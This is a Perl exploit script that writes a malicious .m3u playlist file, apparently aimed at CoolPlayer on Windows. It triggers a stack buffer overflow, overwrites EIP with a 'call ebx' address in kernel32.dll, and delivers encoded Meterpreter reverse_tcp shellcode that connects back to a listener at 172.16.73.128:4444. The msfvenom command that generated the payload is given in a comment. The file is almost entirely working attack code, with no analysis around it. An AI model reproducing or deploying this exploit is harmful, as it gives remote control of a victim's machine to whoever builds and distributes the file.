#!/usr/bin/perl

my $buffsize = 10000; #set consistent buffer size

my $jmp = "\x83\xc3\x64" x 3; #add 300 to ebx
$jmp = $jmp . "\xff\xe3"; # jmp ebx
my $junk = "\x41" x (260 - length($jmp)); #offset to EIP
my $eip = pack("V", 0x7c810395); #call ebx from kernel32.dll

my $nops = "\x90" x 50;

#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\xff' -f perl

my $shell = "\xba\x4d\x92\xbd\xd4\xdd\xc3\xd9\x74\x24\xf4\x5e\x2b\xc9" .
"\xb1\x54\x83\xee\xfc\x31\x56\x0f\x03\x56\x42\x70\x48\x28" .
"\xb4\xf6\xb3\xd1\x44\x97\x3a\x34\x75\x97\x59\x3c\x25\x27" .
"\x29\x10\xc9\xcc\x7f\x81\x5a\xa0\x57\xa6\xeb\x0f\x8e\x89" .
"\xec\x3c\xf2\x88\x6e\x3f\x27\x6b\x4f\xf0\x3a\x6a\x88\xed" .
"\xb7\x3e\x41\x79\x65\xaf\xe6\x37\xb6\x44\xb4\xd6\xbe\xb9" .
"\x0c\xd8\xef\x6f\x07\x83\x2f\x91\xc4\xbf\x79\x89\x09\x85" .
"\x30\x22\xf9\x71\xc3\xe2\x30\x79\x68\xcb\xfd\x88\x70\x0b" .
"\x39\x73\x07\x65\x3a\x0e\x10\xb2\x41\xd4\x95\x21\xe1\x9f" .
"\x0e\x8e\x10\x73\xc8\x45\x1e\x38\x9e\x02\x02\xbf\x73\x39" .
"\x3e\x34\x72\xee\xb7\x0e\x51\x2a\x9c\xd5\xf8\x6b\x78\xbb" .
"\x05\x6b\x23\x64\xa0\xe7\xc9\x71\xd9\xa5\x85\xb6\xd0\x55" .
"\x55\xd1\x63\x25\x67\x7e\xd8\xa1\xcb\xf7\xc6\x36\x2c\x22" .
"\xbe\xa9\xd3\xcd\xbf\xe0\x17\x99\xef\x9a\xbe\xa2\x7b\x5b" .
"\x3f\x77\x11\x5e\xd7\xd4\xf6\x29\xa7\x4d\xf5\xa9\xb6\xd1" .
"\x70\x4f\xe8\xb9\xd2\xc0\x48\x6a\x93\xb0\x20\x60\x1c\xee" .
"\x50\x8b\xf6\x87\xfa\x64\xaf\xf0\x92\x1d\xea\x8b\x03\xe1" .
"\x20\xf6\x03\x69\xc1\x06\xcd\x9a\xa0\x14\x39\xfb\x4a\xe5" .
"\xb9\x96\x4a\x8f\xbd\x30\x1c\x27\xbf\x65\x6a\xe8\x40\x40" .
"\xe8\xef\xbe\x15\xd9\x84\x88\x83\x65\xf3\xf4\x43\x66\x03" .
"\xa2\x09\x66\x6b\x12\x6a\x35\x8e\x5d\xa7\x29\x03\xcb\x48" .
"\x18\xf7\x5c\x21\xa6\x2e\xaa\xee\x59\x05\xa9\xe9\xa6\xdb" .
"\x8f\x51\xcf\x23\x8f\x61\x0f\x4e\x0f\x32\x67\x85\x20\xbd" .
"\x47\x66\xeb\x96\xcf\xed\x7d\x54\x71\xf1\x54\x38\x2f\xf2" .
"\x5a\xe1\x26\x7d\x9d\x16\x47\x7f\xa2\xc0\x7e\xf5\xe3\xd0" .
"\xc4\x06\x5e\x74\x6c\x8d\xa0\x2a\x6e\x84";

my $sploit = $jmp.$junk.$eip.$nops.$shell; #build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file

my $file = "coolplayershell_meterp.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer). "\n";
